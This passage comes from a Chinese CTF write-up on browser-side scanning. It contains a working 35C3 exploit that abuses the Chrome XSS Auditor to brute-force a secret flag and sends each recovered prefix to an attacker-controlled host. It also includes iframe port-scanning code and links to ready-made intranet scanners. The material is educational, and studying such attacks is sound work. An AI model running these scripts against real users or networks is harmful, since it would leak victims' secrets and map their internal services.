              iframe.hasLoadedOnce = 0;
              iframe.onload = function(){
                calls++;
                if(calls > 1) {
                  clearTimeout(timer);
                  that.next();
                  return;
                }
                iframe.hasLoadedOnce = 1;
                var a = document.createElement('a');
                  a.target = iframe.name;
                  a.href = iframe.src + '#';
                  a.click();
                  a = null;
              };
              timer = setTimeout(function(){
                if(iframe.hasLoadedOnce) {
                  that.openPorts.push(port);
                }
                if(that.connections 
            var URL = 'https://filemanager.appspot.com/search?q={{search}}&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b'; //触发Chrome XSS Auditor的url向量
            var charset = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-https://gitee.com/ph0rse/images/raw/master/xz/:;?@[\\]^`{|}~'; //允许遍历的字符集
            var brute = new URLSearchParams(location.search).get('brute') || '35C3_'; //当访问链接带有brute参数时，如go.html?brute=data，burte变量为参数内容。若没有burte参数，则brute变量的值为'35C3_'。
            function guess(i){
                var go = brute + charset[i];//35C3_拼接上猜测的下一个字符
                var x = document.createElement('iframe');//创建iframe框架
                x.name = 'blah';
                var calls = 0;
                x.onload = () => {
                    calls++;
                    //只有当二次及以上触发onload时才执行花括号里的内容
                    if(calls > 1){  
                        console.log("GO IT ==> ",go);//递归再次请求
                        location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
                        x.onload = ()=>{};
                    }
                    var anchor = document.createElement('a');
                    anchor.target = x.name;
                    anchor.href = x.src+'#';
                    anchor.click();
                    anchor = null;
                }
                x.src = URL.replace('{{search}}',go);
                document.body.appendChild(x);
                setTimeout(() =>{
                    document.body.removeChild(x);
                    guess(i+1); //递归尝试字符集中的下一个字符
                },1000);
            }
            guess(0);
            // FLAG: 35C3_xss_auditor_for_the_win
将此EXP放到一个公网可访问的地址上，并将`location.href =
'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);`这一行，改为自己的公网地址。通过nc，将该公网地址发给Admin，让其点开就行。
该EXP通过递归思维进行爆破，从字符集里依次取字符，拼接到'35C3_'上，若不是Flag里的一部分，则onload只执行一次；若加入字符后，是Flag里的一部分，则返回正常页面，但由于触发Chrome
XSS Auditor，总共加载onload 3次。  
第二次会触发以下逻辑：
    if(calls > 1){  
                        console.log("GO IT ==> ",go);//递归再次请求
                        location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
                        x.onload = ()=>{};
                    }
也就是说，携带上本次成功的案例，递归地进行下一轮爆破。
####
这里我把真实Flag放到自己的账号上，模拟自己是拥有flag的Admin，来做一下测试：  
访问`http://deptrai.l4w.pw/35c3/go.html`（自己VPS上一堆环境……就不拿出来让师傅们日了……）
可以看到，界面一直在刷新，也就是进行盲注爆破~  
直到遍历到`35C3_x`的时候，递归地进入了`http://deptrai.l4w.pw/35c3/go.html?burte=35C3_x`页面，开始下一个字符的爆破。
最后通过查看`http://deptrai.l4w.pw/`(可换成自己的VPS)的访问日志，就能获得最终的Flag：`35C3_xss_auditor_for_the_win`。
没有VPS的小伙伴，也可以通过[@Sn00py](https://03i0.com/)推荐的[临时DNS解析网站](http://dnsbin.zhack.ca)，来接收回显。
### 端口爆破脚本
本文只提及了Chrome和Firefox两种浏览器，国外有师傅做了全种类浏览器的异步内网端口扫描，直接把源码保存下来就能用：
[全种类浏览器内网端口扫描](https://blog.skylined.nl/LocalNetworkScanner/)
[异步内网IP扫描](http://portswigger-labs.net/portscan/)  
## 总结
受限于篇幅，没能很全面地介绍前端中的扫描姿势，有时间的话，再补一篇……
在这个XSS漏洞一直不被国内厂商重视，一片忽略的背景下……在“瘦服务端，厚客户端”的背景下……
讲个笑话，某白帽子，发现一处主站XSS漏洞  
A：Alert(1)大法！！！！！！  
客服：忽略  
B：【截图】小姐姐~这个XSS能探测到你们开着两个Redis端口诶~  
客服：￥4000
emmm，笑话有点冷，但好像挺真实的。不扩大战果，不展示危害，永远不被业务人员重视。在危害问题上稍微装X一点，貌似才是对整个安全生态有利的做法。
hackone上，Google某登录页面没有上SSL，赏金500美刀。为这样的企业点赞！
参考链接：  